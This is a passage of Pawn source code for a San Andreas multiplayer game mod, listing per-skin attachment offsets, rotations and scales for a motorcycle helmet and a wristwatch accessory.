	{ 0.072866, 0.029292, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 290 || MotorcycleHelmet1 - SI
	{ 0.072866, 0.029292, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 291 || MotorcycleHelmet1 - SI
	{ 0.033589, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 292 || MotorcycleHelmet1 - SI
	{ 0.076561, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 293 || MotorcycleHelmet1 - SI
	{ 0.076561, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 294 || MotorcycleHelmet1 - SI
	{ 0.036064, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 295 || MotorcycleHelmet1 - SI
	{ 0.036064, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 296 || MotorcycleHelmet1 - SI
	{ 0.070575, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 297 || MotorcycleHelmet1 - SI
	{ 0.070575, 0.006053, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 298 || MotorcycleHelmet1 - SI
	{ 0.070575, 0.035112, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }  // SKINID 299 || MotorcycleHelmet1 - SI
};
new Float:POS_Accesorio_Reloj[300][9] = {
	{ -0.019999, -0.014000, -0.006000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 0 || WatchType1 -
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 1 || WatchType1 - 
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 2 || WatchType1 - NO
	{ -0.004999, -0.004999, 0.000000, 0.000000, 90.000000, 180.000000, 1.299999, 1.100000, 1.100000 }, // SKINID 3 || WatchType1 - NO
	{ 0.009999, 0.002000, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.100000, 1.100000 }, // SKINID 4 || WatchType1 - NO
	{ -0.009999, -0.004999, -0.004999, 0.000000, 90.000000, 180.000000, 1.399999, 1.700000, 1.100000 }, // SKINID 5 || WatchType1 - NO
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 6 || WatchType1 - NO
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 7 || WatchType1 - NO
	{ -0.009999, -0.008000, 0.004999, 0.000000, 90.000000, 180.000000, 1.200000, 1.299999, 1.100000 }, // SKINID 8 || WatchType1 - NO
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 9 || WatchType1 - NO
	{ -0.019999, -0.004000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 10 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 11 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 0.000000, 90.000000, 180.000000, 0.699999, 0.800000, 0.0 }, // SKINID 12 || WatchType1 - NO
	{ 0.000000, -0.014999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 13 || WatchType1 -
	{ -0.009999, -0.009999, 0.009999, 10.000000, 90.000000, 170.000000, 1.000000, 1.399999, 1.000000 }, // SKINID 14 || WatchType1 -
	{ -0.019999, -0.017000, 0.009999, 10.000000, 90.000000, 170.000000, 1.299999, 1.100000, 1.000000 }, // SKINID 15 || WatchType1 -
	{ -0.019999, -0.017000, 0.009999, 10.000000, 90.000000, 170.000000, 1.299999, 1.100000, 0.0 }, // SKINID 16 || WatchType1 - NO
	{ -0.019999, -0.017000, 0.009999, 10.000000, 90.000000, 170.000000, 1.299999, 1.100000, 0.0 }, // SKINID 17 || WatchType1 - NO
	{ -0.019999, -0.017000, 0.009999, 10.000000, 90.000000, 170.000000, 1.299999, 1.100000, 1.000000 }, // SKINID 18 || WatchType1 -
	{ -0.035000, -0.009999, 0.000000, 0.000000, 90.000000, 190.000000, 1.100000, 1.700000, 0.0 }, // SKINID 19 || WatchType1 - NO
	{ -0.035000, -0.009999, 0.000000, 0.000000, 90.000000, 190.000000, 1.100000, 1.700000, 0.0 }, // SKINID 20 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.004999, 0.000000, 90.000000, 190.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 21 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 0.000000, 90.000000, 190.000000, 1.200000, 1.299999, 0.0 }, // SKINID 22 || WatchType1 - NO
	{ 0.000000, 0.000000, -0.009999, 0.000000, 90.000000, 190.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 23 || WatchType1 -
	{ -0.004999, -0.012000, -0.009999, 0.000000, 90.000000, 190.000000, 1.379999, 1.299999, 1.000000 }, // SKINID 24 || WatchType1 -
	{ -0.004999, -0.012000, -0.009999, 0.000000, 90.000000, 190.000000, 1.379999, 1.299999, 1.000000 }, // SKINID 25 || WatchType1 -
	{ -0.004999, -0.006000, 0.000000, 0.000000, 90.000000, 190.000000, 1.000000, 1.360000, 1.000000 }, // SKINID 26 || WatchType1 -
	{ -0.004999, -0.006000, 0.000000, 0.000000, 90.000000, 190.000000, 1.000000, 1.360000, 0.0 }, // SKINID 27 || WatchType1 - NO
	{ -0.004999, -0.006000, -0.004999, 0.000000, 90.000000, 190.000000, 1.100000, 1.360000, 1.000000 }, // SKINID 28 || WatchType1 -
	{ 0.009999, 0.000000, -0.008000, 0.000000, 90.000000, 180.000000, 1.399999, 1.399999, 1.000000 }, // SKINID 29 || WatchType1 -
	{ -0.004999, -0.006000, -0.004999, 0.000000, 90.000000, 190.000000, 1.100000, 1.360000, 1.000000 }, // SKINID 30 || WatchType1 -
	{ 0.000000, -0.050000, 0.004999, 0.000000, 90.000000, 190.000000, 1.100000, 1.360000, 1.000000 }, // SKINID 31 || WatchType1 -
	{ 0.000000, -0.009999, -0.014999, 0.000000, 90.000000, 190.000000, 0.899999, 0.899999, 1.000000 }, // SKINID 32 || WatchType1 -
	{ 0.000000, -0.009999, -0.014999, 0.000000, 90.000000, 190.000000, 0.899999, 0.899999, 0.0 }, // SKINID 33 || WatchType1 - NO
	{ 0.000000, -0.004000, 0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 34 || WatchType1 -
	{ -0.050000, -0.004000, 0.000000, 0.000000, 90.000000, 190.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 35 || WatchType1 -
	{ -0.050000, -0.004000, 0.000000, 0.000000, 90.000000, 190.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 36 || WatchType1 -
	{ -0.050000, -0.004000, 0.000000, 0.000000, 90.000000, 190.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 37 || WatchType1 -
	{ -0.017999, -0.004000, 0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 38 || WatchType1 -
	{ -0.017999, -0.004000, 0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.000000, 0.0 }, // SKINID 39 || WatchType1 - NO
	{ -0.017999, -0.009999, -0.004999, 0.000000, 90.000000, 190.000000, 0.899999, 1.049999, 1.000000 }, // SKINID 40 || WatchType1 -
	{ -0.017999, -0.009999, -0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.149999, 1.000000 }, // SKINID 41 || WatchType1 -
	{ -0.009999, -0.008000, 0.004999, 0.000000, 90.000000, 180.000000, 1.200000, 1.299999, 1.100000 }, // SKINID 42 || WatchType1 - NO
	{ -0.017999, -0.009999, -0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.149999, 0.0 }, // SKINID 43 || WatchType1 - NO
	{ -0.017999, 0.000000, 0.000000, 0.000000, 90.000000, 190.000000, 0.800000, 1.000000, 1.000000 }, // SKINID 44 || WatchType1 -
	{ -0.017999, -0.014999, 0.004999, 0.000000, 90.000000, 190.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 45 || WatchType1 -
	{ -0.004999, -0.009999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 46 || WatchType1 -
	{ -0.004999, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.399999, 1.000000 }, // SKINID 47 || WatchType1 -
	{ -0.004999, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.399999, 1.000000 }, // SKINID 48 || WatchType1 -
	{ -0.004999, -0.004999, 0.000000, 0.000000, 90.000000, 180.000000, 0.899999, 0.899999, 1.000000 }, // SKINID 49 || WatchType1 -
	{ -0.004999, -0.004999, 0.000000, 0.000000, 90.000000, 180.000000, 0.899999, 0.899999, 0.0 }, // SKINID 50 || WatchType1 - NO
	{ -0.007000, -0.006000, 0.004999, 0.000000, 90.000000, 180.000000, 1.299999, 1.200000, 1.000000 }, // SKINID 51 || WatchType1 -
	{ -0.007000, -0.006000, 0.004999, 0.000000, 90.000000, 180.000000, 1.299999, 1.200000, 1.000000 }, // SKINID 52 || WatchType1 -
	{ -0.007000, -0.006000, 0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 53 || WatchType1 -
	{ -0.007000, -0.006000, 0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 54 || WatchType1 - NO
	{ -0.007000, -0.006000, -0.004000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 55 || WatchType1 -
	{ -0.007000, -0.006000, -0.004000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 56 || WatchType1 - NO
	{ -0.007000, -0.006000, -0.004000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 57 || WatchType1 - NO
	{ -0.007000, -0.006000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 58 || WatchType1 -
	{ -0.007000, -0.006000, 0.000000, 0.000000, 90.000000, 180.000000, 1.200000, 1.100000, 1.000000 }, // SKINID 59 || WatchType1 -
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.399999, 1.000000 }, // SKINID 60 || WatchType1 -
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.399999, 0.0 }, // SKINID 61 || WatchType1 - NO
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.399999, 0.0 }, // SKINID 62 || WatchType1 - NO
	{ -0.007000, -0.010999, 0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 63 || WatchType1 -
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 64 || WatchType1 -
	{ -0.009999, -0.014999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.100000 }, // SKINID 65 || WatchType1 - NO
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.299999, 1.299999, 1.000000 }, // SKINID 66 || WatchType1 -
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.299999, 1.299999, 1.000000 }, // SKINID 67 || WatchType1 -
	{ -0.007000, -0.010999, -0.004999, 0.000000, 90.000000, 180.000000, 1.299999, 1.299999, 0.0 }, // SKINID 68 || WatchType1 - NO
	{ -0.007000, -0.004999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 69 || WatchType1 -
	{ -0.007000, -0.004999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 70 || WatchType1 - NO
	{ -0.007000, -0.009999, 0.000000, 0.000000, 90.000000, 180.000000, 1.200000, 1.200000, 1.000000 }, // SKINID 71 || WatchType1 -
	{ -0.007000, -0.014999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 72 || WatchType1 -
	{ -0.007000, -0.014999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 73 || WatchType1 -
	{ -0.007000, -0.014999, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 0.0 }, // SKINID 74 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 75 || WatchType1 -
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 76 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 77 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 78 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 79 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 80 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 81 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 82 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 83 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 84 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 85 || WatchType1 - NO
	{ -0.007000, -0.009999, -0.004999, 0.000000, 90.000000, 180.000000, 1.000000, 1.299999, 0.0 }, // SKINID 86 || WatchType1 - NO
	{ -0.007000, -0.007000, -0.002000, 0.000000, 90.000000, 180.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 87 || WatchType1 -
	{ -0.007000, -0.007000, 0.025000, 0.000000, 90.000000, 180.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 88 || WatchType1 -
	{ -0.007000, -0.007000, 0.025000, 0.000000, 90.000000, 180.000000, 1.000000, 1.100000, 0.0 }, // SKINID 89 || WatchType1 - NO
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 90 || WatchType1 -
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 91 || WatchType1 -
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 92 || WatchType1 -
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 93 || WatchType1 -
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 0.899999, 1.000000 }, // SKINID 94 || WatchType1 -
	{ -0.007000, -0.007000, 0.000000, 0.000000, 90.000000, 180.000000, 1.000000, 0.899999, 1.000000 }, // SKINID 95 || WatchType1 -
	{ -0.007000, -0.017999, 0.004999, 0.000000, 90.000000, 180.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 96 || WatchType1 -
	{ -0.007000, -0.050000, 0.009999, 180.000000, 270.000000, 0.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 97 || WatchType1 -
	{ -0.019999, -0.008000, -0.003000, 90.000000, 90.000000, 90.000000, 1.100000, 1.370000, 1.000000 }, // SKINID 98 || WatchType1 -
	{ -0.019999, -0.008000, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.200000, 1.000000 }, // SKINID 99 || WatchType1 -
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 100 || WatchType1 -
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 101 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 102 || WatchType1 -
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 103 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 104 || WatchType1 -
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 105 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 106 || WatchType1 -
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 107 || WatchType1 -
	{ -0.009999, 0.000000, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 1.000000 }, // SKINID 108 || WatchType1 -
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 109 || WatchType1 -
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 110 || WatchType1 -
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 111 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 112 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 113 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 114 || WatchType1 -
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 115 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 116 || WatchType1 -
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 117 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 118 || WatchType1 - NO
	{ -0.009999, -0.014999, 0.004999, 0.000000, 90.000000, 180.000000, 1.149999, 1.149999, 1.100000 }, // SKINID 119 || WatchType1 - NO
	{ -0.029999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 120 || WatchType1 - NO
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 121 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 122 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 0.0 }, // SKINID 123 || WatchType1 - NO
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.200000, 1.000000 }, // SKINID 124 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.200000, 0.0 }, // SKINID 125 || WatchType1 - NO
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 126 || WatchType1 -
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 0.0 }, // SKINID 127 || WatchType1 - NO
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 128 || WatchType1 -
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 0.0 }, // SKINID 129 || WatchType1 - NO
	{ -0.019999, -0.029999, 0.009999, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 130 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 131 || WatchType1 -
	{ 0.000000, -0.009999, -0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 132 || WatchType1 -
	{ 0.000000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.500000, 1.000000 }, // SKINID 133 || WatchType1 -
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 134 || WatchType1 -
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 0.0 }, // SKINID 135 || WatchType1 - NO
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 0.0 }, // SKINID 136 || WatchType1 - NO
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 137 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 138 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 139 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 140 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 0.0 }, // SKINID 141 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 142 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 0.0 }, // SKINID 143 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 144 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 145 || WatchType1 -
	{ 0.000000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 1.000000 }, // SKINID 146 || WatchType1 -
	{ 0.000000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 0.0 }, // SKINID 147 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 0.0 }, // SKINID 148 || WatchType1 - NO
	{ -0.009999, -0.009999, 0.000000, 0.000000, 90.000000, 180.000000, 1.149999, 1.399999, 1.100000 }, // SKINID 149 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 0.0 }, // SKINID 150 || WatchType1 - NO
	{ 0.000000, -0.025000, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 151 || WatchType1 -
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 152 || WatchType1 -
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 0.0 }, // SKINID 153 || WatchType1 - NO
	{ 0.000000, -0.014999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.500000, 1.000000 }, // SKINID 154 || WatchType1 -
	{ 0.000000, -0.009998, -0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.500000, 1.000000 }, // SKINID 155 || WatchType1 -
	{ 0.000000, -0.009998, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.200000, 1.000000 }, // SKINID 156 || WatchType1 -
	{ 0.000000, -0.009998, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 157 || WatchType1 -
	{ 0.000000, -0.009998, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 0.0 }, // SKINID 158 || WatchType1 - NO
	{ 0.000000, -0.009998, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 159 || WatchType1 -
	{ -0.009999, -0.009998, 0.014999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 160 || WatchType1 -
	{ -0.009999, -0.009998, -0.009999, 90.000000, 90.000000, 90.000000, 1.500000, 1.299999, 1.000000 }, // SKINID 161 || WatchType1 -
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 162 || WatchType1 -
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 0.0 }, // SKINID 163 || WatchType1 - NO
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 0.0 }, // SKINID 164 || WatchType1 - NO
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 0.0 }, // SKINID 165 || WatchType1 - NO
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 0.0 }, // SKINID 166 || WatchType1 - NO
	{ 0.014999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 0.0 }, // SKINID 167 || WatchType1 - NO
	{ -0.039999, -0.004000, 0.006000, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 168 || WatchType1 -
	{ 0.000000, -0.004999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 169 || WatchType1 -
	{ -0.019999, -0.009999, -0.002000, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 1.000000 }, // SKINID 170 || WatchType1 -
	{ 0.000000, -0.003000, 0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.399999, 1.000000 }, // SKINID 171 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 172 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 173 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 174 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 175 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 176 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 177 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 178 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.399999, 1.000000 }, // SKINID 179 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.399999, 1.000000 }, // SKINID 180 || WatchType1 -
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 181 || WatchType1 -
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 0.0 }, // SKINID 182 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 0.0 }, // SKINID 183 || WatchType1 - NO
